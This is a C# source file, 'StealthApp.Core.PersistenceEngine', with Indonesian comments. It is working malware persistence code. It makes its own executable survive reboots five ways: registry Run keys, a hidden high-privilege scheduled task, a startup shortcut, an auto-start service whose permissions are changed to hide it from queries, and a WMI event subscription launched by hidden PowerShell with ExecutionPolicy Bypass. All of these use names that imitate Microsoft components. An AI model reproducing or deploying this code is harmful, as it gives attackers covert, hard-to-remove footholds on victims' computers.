using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace StealthApp.Core
{
    internal static class PersistenceEngine
    {
        static string ExePath => 
            System.Reflection.Assembly
                  .GetExecutingAssembly()
                  .Location.Replace(".dll", ".exe");

        public static void InstallAll()
        {
            Method1_Registry();
            Method2_ScheduledTask();
            Method3_StartupFolder();
            Method4_ServiceInstall();
            Method5_WMISubscription();
        }

        // Method 1: Registry Run Key (HKCU + HKLM)
        static void Method1_Registry()
        {
            try
            {
                string[] keys = {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
                };
                foreach (var k in keys)
                {
                    using var hkcu = Registry.CurrentUser
                        .OpenSubKey(k, true);
                    hkcu?.SetValue("RuntimeBrokerSvc", 
                        $"\"{ExePath}\"");

                    using var hklm = Registry.LocalMachine
                        .OpenSubKey(k, true);
                    hklm?.SetValue("RuntimeBrokerSvc", 
                        $"\"{ExePath}\"");
                }
            }
            catch { }
        }

        // Method 2: Scheduled Task — run on logon + on idle
        static void Method2_ScheduledTask()
        {
            try
            {
                string xml = $@"<?xml version='1.0'?>
<Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <IdleTrigger><Enabled>true</Enabled></IdleTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  </Settings>
  <Actions>
    <Exec>
      <Command>{ExePath}</Command>
    </Exec>
  </Actions>
</Task>";

                string xmlPath = Path.Combine(
                    Path.GetTempPath(), "task.xml");
                File.WriteAllText(xmlPath, xml);

                RunHidden("schtasks.exe",
                    $"/create /tn \"MicrosoftEdgeUpdateCore\" " +
                    $"/xml \"{xmlPath}\" /f");

                File.Delete(xmlPath);
            }
            catch { }
        }

        // Method 3: Startup Folder
        static void Method3_StartupFolder()
        {
            try
            {
                string startup = Environment.GetFolderPath(
                    Environment.SpecialFolder.Startup);
                string linkPath = Path.Combine(
                    startup, "RuntimeBroker.lnk");

                // Buat shortcut via PowerShell
                RunHidden("powershell.exe",
                    $"-WindowStyle Hidden -Command \"" +
                    $"$s=(New-Object -COM WScript.Shell).CreateShortcut('{linkPath}');" +
                    $"$s.TargetPath='{ExePath}';" +
                    $"$s.WindowStyle=7;" + // 7 = minimized hidden
                    $"$s.Save()\"");
            }
            catch { }
        }

        // Method 4: Windows Service
        static void Method4_ServiceInstall()
        {
            try
            {
                RunHidden("sc.exe",
                    $"create \"WinRuntimeSvc\" " +
                    $"binPath= \"{ExePath}\" " +
                    $"start= auto " +
                    $"DisplayName= \"Windows Runtime Service\"");

                RunHidden("sc.exe", "start WinRuntimeSvc");

                // Sembunyiin dari sc query
                RunHidden("sc.exe",
                    "sdset WinRuntimeSvc D:(D;;DCLCWPDTSD;;;IU)" +
                    "(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)" +
                    "(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" +
                    "(A;;CCLCSWRPWPDTLOCRRC;;;SY)" +
                    "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)");
            }
            catch { }
        }

        // Method 5: WMI Event Subscription (paling stealth)
        static void Method5_WMISubscription()
        {
            try
            {
                string script = $@"
$filterName  = 'BrokerFilter'
$consumerName= 'BrokerConsumer'
$exePath     = '{ExePath}'

$filter = Set-WmiInstance -Namespace root\subscription `
    -Class __EventFilter `
    -Arguments @{{
        Name           = $filterName
        EventNamespace = 'root\cimv2'
        QueryLanguage  = 'WQL'
        Query          = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""
    }}

$consumer = Set-WmiInstance -Namespace root\subscription `
    -Class CommandLineEventConsumer `
    -Arguments @{{
        Name             = $consumerName
        CommandLineTemplate = $exePath
    }}

Set-WmiInstance -Namespace root\subscription `
    -Class __FilterToConsumerBinding `
    -Arguments @{{
        Filter   = $filter
        Consumer = $consumer
    }}";

                string ps1 = Path.Combine(
                    Path.GetTempPath(), "wmi_sub.ps1");
                File.WriteAllText(ps1, script);

                RunHidden("powershell.exe",
                    $"-WindowStyle Hidden -ExecutionPolicy Bypass " +
                    $"-File \"{ps1}\"");

                File.Delete(ps1);
            }
            catch { }
        }

        static void RunHidden(string exe, string args)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = exe,
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                })?.WaitForExit(5000);
            }
            catch { }
        }
    }
}
